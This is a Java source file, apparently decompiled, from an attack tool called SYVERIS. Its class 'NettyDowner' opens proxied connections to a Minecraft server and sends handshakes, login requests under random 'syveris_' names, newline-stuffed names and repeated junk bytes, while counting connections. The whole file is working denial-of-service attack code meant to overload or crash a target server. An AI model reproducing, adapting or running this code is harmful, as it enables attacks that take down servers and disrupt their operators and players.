package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.LoginRequest;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.PacketUtils;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.Random;
import java.util.zip.Deflater;

public class NettyDowner implements Method {
   private Handshake handshake;
   private byte[] bytes;
   private byte[] packet;

   private String randomString(int len) {
      int leftLimit = 97;
      int rightLimit = 122;
      int targetStringLength = len;
      Random random = new Random();
      StringBuilder buffer = new StringBuilder(len);

      for(int i = 0; i < targetStringLength; ++i) {
         int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (float)(rightLimit - leftLimit + 1));
         buffer.append((char)randomLimitedInt);
      }

      return buffer.toString();
   }

   public NettyDowner() {
      try {
         this.packet = this.compress(this.createCustomPayload("MC|BEdit", new byte[]{0, 10, 1, 1, 0, 1, 0, 1, 0}), 0);
      } catch (IOException var2) {
         var2.printStackTrace();
      }

      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

      try {
         channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(String.valueOf("syveris_" + (new SecureRandom()).nextInt(9999)))).getWrappedPacket()));
         String nick = "syveris_" + (new SecureRandom()).nextInt(9999);
         bbbb.write(nick.length() + 2);
         bbbb.write(0);
         bbbb.write(nick.length());
         bbbb.writeBytes(nick);

         int var9;
         for(var9 = 0; var9 < this.handshake.getWrappedPacket().length; ++var9) {
            channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(9) + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")).getWrappedPacket()));
            bbbb.write(var9);
         }

         for(var9 = 0; var9 < 260; ++var9) {
            bbbb.write(3);
            bbbb.write(0);
            bbbb.write(1);
            bbbb.write(49);
         }
      } catch (IOException var7) {
         var7.printStackTrace();
      }

      channel.writeAndFlush(b);
      channel.writeAndFlush(bbbb);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
   }

   public byte[] compress(byte[] packet, int threshold) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      byte[] buffer = new byte[8192];
      if (packet.length >= threshold && threshold > 0) {
         byte[] data = new byte[packet.length];
         System.arraycopy(packet, 0, data, 0, packet.length);
         PacketUtils.writeVarInt(out, data.length);
         Deflater def = new Deflater();
         def.setInput(data, 0, data.length);
         def.finish();

         while(!def.finished()) {
            int i = def.deflate(buffer);
            out.write(buffer, 0, i);
         }

         def.reset();
      } else {
         PacketUtils.writeVarInt(out, 0);
         out.write(packet);
      }

      out.close();
      return bytes.toByteArray();
   }

   public byte[] createCustomPayload(String packet, byte[] input) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      out.write(254);
      out.write(1);
      out.write(250);
      char[] achar = packet.toCharArray();
      out.writeShort(achar.length);
      int n = achar.length;
      boolean n2 = false;
      out.write(input);
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
      writeVarInt(packetData.length, out);
      out.write(packetData);
   }

   public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
      while((value & -128) != 0) {
         out.writeByte(value & 127 | 128);
         value >>>= 7;
      }

      out.writeByte(value);
   }
}
